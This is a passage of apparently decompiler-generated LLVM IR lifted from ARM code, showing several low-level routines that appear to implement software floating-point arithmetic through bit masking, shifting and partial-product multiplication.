  %v5_14f60 = mul i32 %v2_14f60, 4096
  %v6_14f60 = or i32 %v5_14f60, %v1_14f60
  %v8_14f60 = icmp eq i32 %v6_14f60, 0
  br i1 %v8_14f60, label %bb43, label %.thread17

bb43:                                             ; preds = %bb42
  %v5_14f64 = icmp eq i32 %v2_14f60, %v1_14f68
  br i1 %v5_14f64, label %bb44, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb42, %bb43
  %v2_14f68 = or i32 %v1_14f68, 524288
  br label %bb44

bb44:                                             ; preds = %bb43, %.thread17
  %v11_14f6c = phi i32 [ %v1_14f68, %bb43 ], [ %v2_14f68, %.thread17 ]
  ret i32 %v11_14f6c

; uselistorder directives
  uselistorder i32 %v1_14f68, { 2, 3, 0, 1 }
  uselistorder i32 %v1_14f58, { 1, 0 }
  uselistorder i1 %v1_14f14, { 1, 0 }
  uselistorder i32 %v1_14ee4, { 2, 1, 0 }
  uselistorder i32 %v0_14ed4, { 4, 1, 3, 0, 2 }
  uselistorder i32 %v0_14ed0, { 3, 4, 2, 5, 6, 7, 8, 1, 0, 9 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_14eec, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_14f70(i32 %arg1) local_unnamed_addr {
dec_label_pc_14f70:
  %v2_14f70 = icmp eq i32 %arg1, 0
  br i1 %v2_14f70, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14f70
  ret i32 0

.thread:                                          ; preds = %dec_label_pc_14f70
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r1, align 4
  %v1_14f94 = call i32 @function_14dd8(i32 0)
  ret i32 %v1_14f94
}

define i32 @function_14f98() local_unnamed_addr {
dec_label_pc_14f98:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v0_14f98 = load i32, i32* @r0, align 4
  %v2_14f98 = icmp eq i32 %v0_14f98, 0
  br i1 %v2_14f98, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14f98
  store i32 0, i32* @r1, align 4
  ret i32 0

.thread:                                          ; preds = %dec_label_pc_14f98
  store i32 1074, i32* @r4, align 4
  %v1_14fb0 = and i32 %v0_14f98, -2147483648
  store i32 %v1_14fb0, i32* @r5, align 4
  %v2_14fb0 = icmp eq i32 %v1_14fb0, 0
  br i1 %v2_14fb0, label %bb20, label %bb19

bb19:                                             ; preds = %.thread
  %v2_14fb4 = sub i32 0, %v0_14f98
  store i32 %v2_14fb4, i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %.thread, %bb19
  %v0_14fb8 = phi i32 [ %v0_14f98, %.thread ], [ %v2_14fb4, %bb19 ]
  store i32 %v0_14fb8, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_14fc0 = call i32 @function_14dd8(i32 0)
  %v2_14fc4 = mul i32 %v1_14fc0, 2
  %v4_14fc4 = icmp eq i32 %v2_14fc4, 0
  %v1_14fc8 = and i32 %v2_14fc4, 4
  %v2_14fc8 = icmp ne i32 %v1_14fc8, 0
  %v3_14fc8 = sdiv i32 %v2_14fc4, 8
  %v3_14fcc = zext i1 %v2_14fc8 to i32
  %v6_14fcc = zext i32 %v3_14fc8 to i64
  %v7_14fcc = sub nsw i32 33, %v3_14fc8
  %v8_14fcc = zext i32 %v7_14fcc to i64
  %v9_14fcc = shl i64 %v6_14fcc, %v8_14fcc
  %v10_14fcc = sub nsw i32 32, %v3_14fc8
  %v11_14fcc = shl i32 %v3_14fcc, %v10_14fcc
  %v12_14fcc = zext i32 %v11_14fcc to i64
  %v14_14fcc = or i64 %v12_14fcc, %v9_14fcc
  %v15_14fcc = trunc i64 %v14_14fcc to i32
  store i32 %v15_14fcc, i32* %r0.global-to-local, align 4
  %v3_14fd0 = mul i32 %v1_14fc0, 536870912
  store i32 %v3_14fd0, i32* @r1, align 4
  br i1 %v4_14fc4, label %.thread3, label %bb21

bb21:                                             ; preds = %bb20
  %v4_14fd4 = icmp ult i32 %v2_14fc4, 16777216
  br i1 %v4_14fd4, label %bb25, label %bb22

bb22:                                             ; preds = %bb21
  %v4_14fe835 = icmp ugt i32 %v2_14fc4, -16777217
  br i1 %v4_14fe835, label %bb24.thread, label %bb23

bb24.thread:                                      ; preds = %bb22
  br label %.thread4

bb23:                                             ; preds = %bb22
  %v2_14fdc7 = xor i32 %v15_14fcc, 939524096
  store i32 %v2_14fdc7, i32* %r0.global-to-local, align 4
  ret i32 %v2_14fdc7

.thread3:                                         ; preds = %bb20
  br label %.thread4

.thread4:                                         ; preds = %bb24.thread, %bb25, %.thread3
  %merge = phi i32 [ %v15_14fcc, %.thread3 ], [ %v1_15000, %bb25 ], [ %v15_14fcc, %bb24.thread ]
  ret i32 %merge

bb25:                                             ; preds = %bb21
  store i32 896, i32* @r4, align 4
  %v1_14ff8 = and i32 %v15_14fcc, -2147483648
  store i32 %v1_14ff8, i32* @r5, align 4
  %tmp = bitcast i32 %v15_14fcc to float
  %tmp36 = call float @fabsf(float %tmp)
  %v1_14ffc = bitcast float %tmp36 to i32
  store i32 %v1_14ffc, i32* %r0.global-to-local, align 4
  %v1_15000 = call i32 @function_14dd8(i32 %v1_14ffc)
  store i32 %v1_15000, i32* %r0.global-to-local, align 4
  %v1_15004 = load i32, i32* @r1, align 4
  %v2_15004 = or i32 %v1_15004, %v1_15000
  %v4_15004 = icmp eq i32 %v2_15004, 0
  br i1 %v4_15004, label %.thread4, label %dec_label_pc_15034

dec_label_pc_15034:                               ; preds = %bb25
  store i32 0, i32* @r5, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  store i32 %v1_15004, i32* %r0.global-to-local, align 4
  store i32 %v1_15000, i32* %r1.global-to-local, align 4
  %tmp37 = icmp ult i32 %v1_15004, 4194304
  call void @__pseudo_cond_branch(i1 %tmp37, i32 ptrtoint (i32* @global_var_14d7c.619 to i32))
  %tmp38 = icmp ult i32 %v1_15004, 33554432
  br i1 %tmp38, label %bb27, label %bb26

bb26:                                             ; preds = %dec_label_pc_15034
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_15034, %bb26
  %v1_15060 = phi i32 [ 3, %dec_label_pc_15034 ], [ 6, %bb26 ]
  %tmp39 = icmp ult i32 %v1_15004, 268435456
  br i1 %tmp39, label %bb29, label %bb28

bb28:                                             ; preds = %bb27
  %v2_15060 = add nuw nsw i32 %v1_15060, 3
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v0_15064 = phi i32 [ %v1_15060, %bb27 ], [ %v2_15060, %bb28 ]
  %not. = icmp slt i32 %v1_15004, 0
  %v4_15064 = zext i1 %not. to i32
  %v5_15064 = add nsw i32 %v0_15064, %v4_15064
  %v1_15068 = sub nsw i32 32, %v5_15064
  %v0_1506c = load i32, i32* %r1.global-to-local, align 4
  %v6_1506c = shl i32 %v0_1506c, %v1_15068
  store i32 %v6_1506c, i32* @ip, align 4
  %v6_15070 = lshr i32 %v0_1506c, %v5_15064
  %v1_15074 = load i32, i32* %r0.global-to-local, align 4
  %v7_15074 = shl i32 %v1_15074, %v1_15068
  %v8_15074 = or i32 %v7_15074, %v6_15070
  store i32 %v8_15074, i32* %r1.global-to-local, align 4
  %v6_15078 = lshr i32 %v1_15074, %v5_15064
  store i32 %v6_15078, i32* %r0.global-to-local, align 4
  %v0_1507c = load i32, i32* %r4.global-to-local, align 4
  %v2_1507c = add i32 %v0_1507c, %v5_15064
  store i32 %v2_1507c, i32* @r4, align 4
  %v4_15080 = sext i32 %v8_15074 to i64
  %v5_15080 = call i32 @function_14d7c(i32 %v6_15078, i64 %v4_15080, i32 %v5_15064, i32 %v1_15068)
  store i32 %v5_15080, i32* %r0.global-to-local, align 4
  ret i32 %v5_15080

; uselistorder directives
  uselistorder i32 %v5_15064, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_15004, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v1_15000, { 2, 1, 3, 0 }
  uselistorder i32 %v1_14ffc, { 1, 0 }
  uselistorder i32 %v15_14fcc, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v3_14fc8, { 1, 2, 0 }
  uselistorder i32 %v2_14fc4, { 1, 0, 4, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 6, 0, 1, 2, 7, 3, 5, 4, 8, 9 }
  uselistorder i32 6, { 1, 13, 14, 15, 9, 10, 2, 16, 17, 3, 4, 5, 19, 6, 7, 18, 0, 8, 11, 12 }
  uselistorder i32 3, { 53, 21, 50, 66, 51, 67, 52, 14, 27, 28, 59, 23, 60, 61, 24, 62, 63, 15, 68, 0, 30, 29, 39, 3, 2, 1, 4, 64, 31, 5, 6, 16, 7, 8, 40, 41, 74, 42, 43, 44, 45, 46, 47, 69, 12, 32, 70, 33, 9, 13, 54, 75, 22, 72, 73, 17, 65, 18, 19, 11, 20, 71, 10, 48, 25, 49, 26, 34, 35, 36, 55, 56, 57, 37, 58, 38 }
  uselistorder i32 (i32)* @function_14dd8, { 1, 0, 2 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %.thread4, { 1, 2, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @function_15084(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15084:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15084 = load i32, i32* @r4, align 4
  store i32 %v3_15084, i32* %stack_var_-16, align 4
  %v6_15084 = load i32, i32* @r5, align 4
  %v9_15084 = load i32, i32* @r6, align 4
  store i32 2047, i32* @ip, align 4
  %v4_15090 = udiv i32 %arg1, 1048576
  %v5_15090 = urem i32 %v4_15090, 2048
  store i32 %v5_15090, i32* %r4.global-to-local, align 4
  %v6_15090 = icmp eq i32 %v5_15090, 0
  br i1 %v6_15090, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_15084
  %v5_15094 = udiv i32 %arg3, 1048576
  %v6_15094 = urem i32 %v5_15094, 2048
  store i32 %v6_15094, i32* @r5, align 4
  %v7_15094 = icmp eq i32 %v6_15094, 0
  br i1 %v7_15094, label %.thread1, label %bb41

bb41:                                             ; preds = %bb
  %v5_15098 = icmp eq i32 %v5_15090, 2047
  br i1 %v5_15098, label %.thread1, label %bb42

bb42:                                             ; preds = %bb41
  %v5_1509c = icmp eq i32 %v6_15094, 2047
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15084, %bb, %bb41, %bb42
  %v0_150a0 = phi i1 [ true, %bb ], [ true, %bb41 ], [ %v5_1509c, %bb42 ], [ true, %dec_label_pc_15084 ]
  store i32 86180, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v0_150a0, i32 ptrtoint (i32* @global_var_15320.621 to i32))
  %v0_150a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_150a4 = load i32, i32* @r5, align 4
  %v2_150a4 = add i32 %v1_150a4, %v0_150a4
  store i32 %v2_150a4, i32* %r4.global-to-local, align 4
  %v2_150a8 = xor i32 %arg3, %arg1
  %v1_150ac = load i32, i32* @ip, align 4
  %tmp = mul i32 %v1_150ac, -2097152
  %v5_150ac = add i32 %tmp, -1
  %v6_150ac = and i32 %v5_150ac, %arg1
  store i32 %v6_150ac, i32* %r0.global-to-local, align 4
  %v6_150b0 = and i32 %v5_150ac, %arg3
  store i32 %v6_150b0, i32* %r2.global-to-local, align 4
  %v4_150b4 = mul i32 %arg1, 4096
  %v5_150b4 = or i32 %v4_150b4, %arg2
  store i32 %v5_150b4, i32* @r5, align 4
  %v7_150b4 = icmp eq i32 %v5_150b4, 0
  br i1 %v7_150b4, label %.thread, label %bb43

.thread:                                          ; preds = %.thread1
  %v1_150bc17 = or i32 %v6_150ac, 1048576
  store i32 %v1_150bc17, i32* %r0.global-to-local, align 4
  %v1_150c018 = or i32 %v6_150b0, 1048576
  store i32 %v1_150c018, i32* %r2.global-to-local, align 4
  %v1_151f819 = and i32 %v2_150a8, -2147483648
  store i32 %v1_151f819, i32* @r6, align 4
  br label %dec_label_pc_151f8

bb43:                                             ; preds = %.thread1
  %v5_150b8 = mul i32 %arg3, 4096
  %v6_150b8 = or i32 %v5_150b8, %arg4
  store i32 %v6_150b8, i32* @r5, align 4
  %v8_150b8 = icmp eq i32 %v6_150b8, 0
  %v1_150bc = or i32 %v6_150ac, 1048576
  store i32 %v1_150bc, i32* %r0.global-to-local, align 4
  %v1_150c0 = or i32 %v6_150b0, 1048576
  store i32 %v1_150c0, i32* %r2.global-to-local, align 4
  %v1_151f8 = and i32 %v2_150a8, -2147483648
  store i32 %v1_151f8, i32* @r6, align 4
  br i1 %v8_150b8, label %dec_label_pc_151f8, label %dec_label_pc_150c8

dec_label_pc_150c8:                               ; preds = %bb43
  store i32 %v1_151f8, i32* %stack_var_-40, align 4
  %v6_150cc = load i32, i32* @r7, align 4
  %v9_150cc = load i32, i32* @r8, align 4
  %v12_150cc = load i32, i32* @sb, align 4
  %v15_150cc = load i32, i32* @sl, align 4
  %v3_150d0 = udiv i32 %arg2, 65536
  %v3_150d4 = udiv i32 %arg4, 65536
  store i32 %v3_150d4, i32* %r8.global-to-local, align 4
  %v3_150d8 = udiv i32 %v1_150bc, 65536
  store i32 %v3_150d8, i32* %sb.global-to-local, align 4
  %v3_150dc = udiv i32 %v1_150c0, 65536
  %tmp59 = mul i32 %v3_150d0, -65536
  %v5_150e0 = add i32 %tmp59, -1
  %v6_150e0 = and i32 %v5_150e0, %arg2
  store i32 %v6_150e0, i32* %r1.global-to-local, align 4
  %tmp60 = mul i32 %v3_150d4, -65536
  %v5_150e4 = add i32 %tmp60, -1
  %v6_150e4 = and i32 %v5_150e4, %arg4
  %tmp61 = mul i32 %v3_150d8, -65536
  %v5_150e8 = add i32 %tmp61, -1
  %v6_150e8 = and i32 %v6_150ac, %v5_150e8
  store i32 %v6_150e8, i32* %r0.global-to-local, align 4
  %tmp62 = mul i32 %v3_150dc, -65536
  %v5_150ec = add i32 %tmp62, -1
  %v6_150ec = and i32 %v6_150b0, %v5_150ec
  store i32 %v6_150ec, i32* %r2.global-to-local, align 4
  %v2_150f0 = mul i32 %v6_150e4, %v6_150e0
  %v2_150f4 = mul i32 %v3_150d4, %v6_150e0
  %v2_15100 = and i32 %v2_150f4, 32768
  %v3_15100 = icmp ne i32 %v2_15100, 0
  %v4_15100 = udiv i32 %v2_150f4, 65536
  %v7_15100 = zext i1 %v3_15100 to i32
  %v2_15104 = mul i32 %v6_150e4, %v3_150d0
  %tmp53 = add i32 %v2_15104, %v2_150f4
  %tmp54 = mul i32 %tmp53, 65536
  %v5_15108 = add i32 %tmp54, %v2_150f0
  store i32 %v5_15108, i32* %ip.global-to-local, align 4
  %v2_1510c = and i32 %v2_15104, 32768
  %v3_1510c = icmp ne i32 %v2_1510c, 0
  %v4_1510c = udiv i32 %v2_15104, 65536
  %v7_1510c = zext i1 %v3_1510c to i32
  %v2_15110 = mul i32 %v3_150dc, %v6_150e0
  %v2_1511c = and i32 %v2_15110, 32768
  %v3_1511c = icmp ne i32 %v2_1511c, 0
  %v4_1511c = udiv i32 %v2_15110, 65536
  %v7_1511c = zext i1 %v3_1511c to i32
  %v8_1511c = add nuw nsw i32 %v7_1511c, %v4_1511c
  %v2_15120 = mul i32 %v6_150ec, %v3_150d0
  %v2_15128 = and i32 %v2_15120, 32768
  %v3_15128 = icmp ne i32 %v2_15128, 0
  %v4_15128 = udiv i32 %v2_15120, 65536
  %v6_15128 = add nuw nsw i32 %v8_1511c, %v4_15128
  %v7_15128 = zext i1 %v3_15128 to i32
  %v8_15128 = add nuw nsw i32 %v6_15128, %v7_15128
  %v2_1512c = mul i32 %v3_150d4, %v6_150e8
  %v2_15134 = and i32 %v2_1512c, 32768
  %v3_15134 = icmp ne i32 %v2_15134, 0
  %v4_15134 = udiv i32 %v2_1512c, 65536
  %v6_15134 = add nuw nsw i32 %v8_15128, %v4_15134
  %v7_15134 = zext i1 %v3_15134 to i32
  %v8_15134 = add nuw nsw i32 %v6_15134, %v7_15134
  %v2_15138 = mul i32 %v6_150e4, %v3_150d8
  %v4_1513c = mul i32 %v2_15138, 65536
  %tmp55 = add i32 %v2_15120, %v2_15110
  %tmp56 = add i32 %tmp55, %v2_1512c
  %tmp57 = mul i32 %tmp56, 65536
  %v8_1510c = add nuw nsw i32 %v7_15100, %v4_15100
  %v5_15118 = add nuw nsw i32 %v8_1510c, %v4_1510c
  %v5_15124 = add nuw nsw i32 %v5_15118, %v7_1510c
  %v5_15130 = add i32 %v5_15124, %v4_1513c
  %v5_1513c = add i32 %v5_15130, %tmp57
  %v2_15140 = and i32 %v2_15138, 32768
  %v3_15140 = icmp ne i32 %v2_15140, 0
  %v4_15140 = udiv i32 %v2_15138, 65536
  %v6_15140 = add nuw nsw i32 %v8_15134, %v4_15140
  %v7_15140 = zext i1 %v3_15140 to i32
  %v8_15140 = add i32 %v6_15140, %v7_15140
  %v2_15144 = mul i32 %v3_150dc, %v6_150e8
  %v2_15148 = mul nuw i32 %v3_150dc, %v3_150d8
  %v4_1514c = mul i32 %v2_15144, 65536
  %v5_1514c = add i32 %v8_15140, %v4_1514c
  %v2_15150 = and i32 %v2_15144, 32768
  %v3_15150 = icmp ne i32 %v2_15150, 0
  %v4_15150 = udiv i32 %v2_15144, 65536
  %v6_15150 = add i32 %v4_15150, %v2_15148
  %v7_15150 = zext i1 %v3_15150 to i32
  %v2_15154 = mul i32 %v6_150ec, %v3_150d8
  %v4_15158 = mul i32 %v2_15154, 65536
  %v5_15158 = add i32 %v5_1514c, %v4_15158
  %v2_1515c = and i32 %v2_15154, 32768
  %v3_1515c = icmp ne i32 %v2_1515c, 0
  %v4_1515c = udiv i32 %v2_15154, 65536
  %v7_1515c = zext i1 %v3_1515c to i32
  %v2_15160 = mul i32 %v6_150e0, %v6_150ec
  %v2_15164 = add i32 %v2_15160, %v5_1513c
  %v3_15164 = icmp ult i32 %v2_15164, %v5_1513c
  %v2_15168 = mul nuw i32 %v3_150d0, %v3_150dc
  %v3_1516c = add i32 %v5_15158, %v2_15168
  %v4_1516c = zext i1 %v3_15164 to i32
  %v5_1516c = add i32 %v4_1516c, %v3_1516c
  %v9_1516c = icmp ule i32 %v5_1516c, %v5_15158
  %v10_1516c = icmp ult i32 %v3_1516c, %v5_15158
  %v11_1516c = select i1 %v3_15164, i1 %v9_1516c, i1 %v10_1516c
  %v2_15170 = mul i32 %v6_150e4, %v6_150e8
  %v2_15174 = zext i1 %v11_1516c to i32
  %v2_15178 = add i32 %v2_15170, %v2_15164
  %v3_15178 = icmp ult i32 %v2_15178, %v2_15164
  %v0_1517c = load i32, i32* %sb.global-to-local, align 4
  %v1_1517c = load i32, i32* %r8.global-to-local, align 4
  %v2_1517c = mul i32 %v1_1517c, %v0_1517c
  %v3_15180 = add i32 %v2_1517c, %v5_1516c
  %v4_15180 = zext i1 %v3_15178 to i32
  %v5_15180 = add i32 %v4_15180, %v3_15180
  %v9_15180 = icmp ule i32 %v5_15180, %v5_1516c
  %v10_15180 = icmp ult i32 %v3_15180, %v5_1516c
  %v11_15180 = select i1 %v3_15178, i1 %v9_15180, i1 %v10_15180
  %v2_15184 = mul i32 %v1_1517c, %v3_150d0
  %v2_15188 = zext i1 %v11_15180 to i32
  %v8_15150 = add i32 %v6_15150, %v4_1515c
  %v6_1515c = add i32 %v8_15150, %v7_15150
  %v8_1515c = add i32 %v6_1515c, %v7_1515c
  %v3_15174 = add i32 %v8_1515c, %v2_15174
  %v3_15188 = add i32 %v3_15174, %v2_15188
  %v2_1518c = add i32 %v2_15184, %v2_15178
  %v3_1518c = icmp ult i32 %v2_1518c, %v2_15178
  %v1_15190 = load i32, i32* %r2.global-to-local, align 4
  %v2_15190 = mul i32 %v1_15190, %v6_150e8
  %v3_15194 = add i32 %v5_15180, %v2_15190
  %v4_15194 = zext i1 %v3_1518c to i32
  %v5_15194 = add i32 %v4_15194, %v3_15194
  %v9_15194 = icmp ule i32 %v5_15194, %v5_15180
  %v10_15194 = icmp ult i32 %v3_15194, %v5_15180
  %v11_15194 = select i1 %v3_1518c, i1 %v9_15194, i1 %v10_15194
  %v2_15198 = zext i1 %v11_15194 to i32
  %v3_15198 = add i32 %v2_15198, %v3_15188
  %v2_1519c = load i32, i32* %stack_var_-40, align 4
  store i32 %v6_150cc, i32* @r7, align 4
  store i32 %v9_150cc, i32* @r8, align 4
  store i32 %v12_150cc, i32* @sb, align 4
  store i32 %v15_150cc, i32* @sl, align 4
  %v0_151a0 = load i32, i32* %ip.global-to-local, align 4
  %v2_151a0 = icmp eq i32 %v0_151a0, 0
  br i1 %v2_151a0, label %bb45, label %bb44

bb44:                                             ; preds = %dec_label_pc_150c8
  %v2_151a4 = or i32 %v2_1518c, 1
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_150c8, %bb44
  %v0_151b8 = phi i32 [ %v2_1518c, %dec_label_pc_150c8 ], [ %v2_151a4, %bb44 ]
  %v0_151a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_151a8 = add i32 %v0_151a8, -255
  %v2_151ac = icmp ugt i32 %v3_15198, 511
  %v2_151b0 = icmp eq i1 %v2_151ac, false
  %v5_151b0 = sext i1 %v2_151b0 to i32
  %v3_151b0 = add nsw i32 %v5_151b0, -1023
  %v6_151b0 = add i32 %v3_151b0, %v0_151a8
  store i32 %v6_151b0, i32* %r4.global-to-local, align 4
  %v3_151b4 = icmp ugt i32 %v1_151a8, 768
  br i1 %v3_151b4, label %dec_label_pc_151c4, label %dec_label_pc_151b8

dec_label_pc_151b8:                               ; preds = %bb45
  %v1_151b8 = icmp slt i32 %v0_151b8, 0
  %v2_151b8 = mul i32 %v0_151b8, 2
  %v3_151bc = mul i32 %v5_15194, 2
  %v4_151bc = zext i1 %v1_151b8 to i32
  %v5_151bc = or i32 %v4_151bc, %v3_151bc
  %v9_151bc = icmp ule i32 %v5_151bc, %v5_15194
  %v10_151bc = icmp ult i32 %v3_151bc, %v5_15194
  %v11_151bc = select i1 %v1_151b8, i1 %v9_151bc, i1 %v10_151bc
  %v3_151c0 = mul i32 %v3_15198, 2
  %v4_151c0 = zext i1 %v11_151bc to i32
  %v5_151c0 = or i32 %v4_151c0, %v3_151c0
  br label %dec_label_pc_151c4

dec_label_pc_151c4:                               ; preds = %bb45, %dec_label_pc_151b8
  %v0_151d4 = phi i32 [ %v0_151b8, %bb45 ], [ %v2_151b8, %dec_label_pc_151b8 ]
  %v0_151cc = phi i32 [ %v5_15194, %bb45 ], [ %v5_151bc, %dec_label_pc_151b8 ]
  %v1_151c4 = phi i32 [ %v3_15198, %bb45 ], [ %v5_151c0, %dec_label_pc_151b8 ]
  %v4_151c4 = mul i32 %v1_151c4, 2048
  %v4_151c8 = udiv i32 %v0_151cc, 2097152
  %v5_151c4 = or i32 %v4_151c8, %v2_1519c
  %v5_151c8 = or i32 %v5_151c4, %v4_151c4
  store i32 %v5_151c8, i32* %r0.global-to-local, align 4
  %v3_151cc = mul i32 %v0_151cc, 2048
  %v4_151d0 = udiv i32 %v0_151d4, 2097152
  %v5_151d0 = or i32 %v3_151cc, %v4_151d0
  store i32 %v5_151d0, i32* %r1.global-to-local, align 4
  %v3_151d4 = mul i32 %v0_151d4, 2048
  store i32 %v3_151d4, i32* @lr, align 4
  %v1_151d8 = add i32 %v6_151b0, -253
  store i32 %v1_151d8, i32* @ip, align 4
  %v2_151d8 = icmp ugt i32 %v6_151b0, 252
  %v7_151d8 = icmp eq i32 %v6_151b0, 253
  %v2_151dc = xor i1 %v7_151d8, true
  %v3_151dc = and i1 %v2_151d8, %v2_151dc
  br i1 %v3_151dc, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_151c4
  %v6_151dc = icmp ugt i32 %v1_151d8, 1791
  %v11_151dc = icmp eq i32 %v1_151d8, 1792
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_151c4, %bb46
  %v1_151e0 = phi i1 [ %v7_151d8, %dec_label_pc_151c4 ], [ %v11_151dc, %bb46 ]
  %v0_151e0 = phi i1 [ %v2_151d8, %dec_label_pc_151c4 ], [ %v6_151dc, %bb46 ]
  %v2_151e0 = xor i1 %v1_151e0, true
  %v3_151e0 = and i1 %v0_151e0, %v2_151e0
  call void @__pseudo_cond_branch(i1 %v3_151e0, i32 ptrtoint (i32* @global_var_15224.622 to i32))
  %v0_151e4 = load i32, i32* @lr, align 4
  %v2_151e4 = icmp slt i32 %v0_151e4, 0
  %v6_151e4 = icmp eq i32 %v0_151e4, -2147483648
  %v1_151e8 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v6_151e4, label %bb48, label %._crit_edge

bb48:                                             ; preds = %bb47
  %v2_151e8 = urem i32 %v1_151e8, 2
  %v3_151e8 = icmp ne i32 %v2_151e8, 0
  %v4_151e8 = udiv i32 %v1_151e8, 2
  store i32 %v4_151e8, i32* @lr, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb47, %bb48
  %v1_151ec = phi i1 [ %v3_151e8, %bb48 ], [ %v2_151e4, %bb47 ]
  %v2_151ec = zext i1 %v1_151ec to i32
  %v3_151ec = add i32 %v2_151ec, %v1_151e8
  store i32 %v3_151ec, i32* @r1, align 4
  %v0_151f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_151f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_151f0 = and i32 %v1_151f0, 4096
  %v3_151f0 = icmp ne i32 %v2_151f0, 0
  %v4_151f0 = mul i32 %v1_151f0, 1048576
  %v6_151f0 = add i32 %v4_151f0, %v0_151f0
  %v7_151f0 = zext i1 %v3_151f0 to i32
  %v8_151f0 = add i32 %v7_151f0, %v6_151f0
  store i32 %v8_151f0, i32* %r0.global-to-local, align 4
  %v2_151f4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_151f4, i32* @r4, align 4
  store i32 %v6_15084, i32* @r5, align 4
  store i32 %v9_15084, i32* @r6, align 4
  ret i32 %v8_151f0

dec_label_pc_151f8:                               ; preds = %.thread, %bb43
  %v1_151f822 = phi i32 [ %v1_151f819, %.thread ], [ %v1_151f8, %bb43 ]
  %v1_150c021 = phi i32 [ %v1_150c018, %.thread ], [ %v1_150c0, %bb43 ]
  %v1_150bc20 = phi i32 [ %v1_150bc17, %.thread ], [ %v1_150bc, %bb43 ]
  %v2_151fc = or i32 %v1_150bc20, %v1_151f822
  %v2_15200 = or i32 %arg4, %arg2
  store i32 %v2_15200, i32* @r1, align 4
  %v2_15204 = xor i32 %v2_151fc, %v1_150c021
  store i32 %v2_15204, i32* %r0.global-to-local, align 4
  %v4_15208 = udiv i32 %v1_150ac, 2
  %v5_15208 = sub i32 %v2_150a4, %v4_15208
  store i32 %v5_15208, i32* %r4.global-to-local, align 4
  %v7_15208 = sub i32 0, %v5_15208
  %v8_15208 = and i32 %v2_150a4, %v7_15208
  %v11_15208 = icmp eq i32 %v2_150a4, %v4_15208
  %v7_1520c = icmp sgt i32 %v2_150a4, %v4_15208
  br i1 %v7_1520c, label %bb49, label %bb50

bb49:                                             ; preds = %dec_label_pc_151f8
  %v10_1520c = sub i32 %v1_150ac, %v5_15208
  store i32 %v10_1520c, i32* @r5, align 4
  %v12_1520c = xor i32 %v5_15208, %v1_150ac
  %v13_1520c = xor i32 %v10_1520c, %v1_150ac
  %v14_1520c = and i32 %v13_1520c, %v12_1520c
  %v17_1520c = icmp eq i32 %v1_150ac, %v5_15208
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_151f8, %bb49
  %v2_15214.in = phi i32 [ %v8_15208, %dec_label_pc_151f8 ], [ %v14_1520c, %bb49 ]
  %v1_15214.in = phi i32 [ %v5_15208, %dec_label_pc_151f8 ], [ %v10_1520c, %bb49 ]
  %v0_15214 = phi i1 [ %v11_15208, %dec_label_pc_151f8 ], [ %v17_1520c, %bb49 ]
  %v1_15214 = icmp slt i32 %v1_15214.in, 0
  %v2_15214 = icmp slt i32 %v2_15214.in, 0
  %v3_15210 = xor i1 %v2_15214, %v1_15214
  %v4_15210 = or i1 %v0_15214, %v3_15210
  br i1 %v4_15210, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v9_1521028 = mul i32 %v5_15208, 1048576
  %v10_1521029 = or i32 %v2_15204, %v9_1521028
  store i32 %v10_1521029, i32* %r0.global-to-local, align 4
  %v7_15214 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_15214, i32* @r4, align 4
  store i32 %v6_15084, i32* @r5, align 4
  store i32 %v9_15084, i32* @r6, align 4
  ret i32 %v10_1521029

bb52:                                             ; preds = %bb50
  %v1_15218 = or i32 %v2_15204, 1048576
  store i32 %v1_15218, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v1_15220 = add i32 %v5_15208, -1
  store i32 %v1_15220, i32* @r4, align 4
  ret i32 %v1_15218

; uselistorder directives
  uselistorder i32 %v5_15208, { 4, 1, 0, 6, 3, 5, 2, 7 }
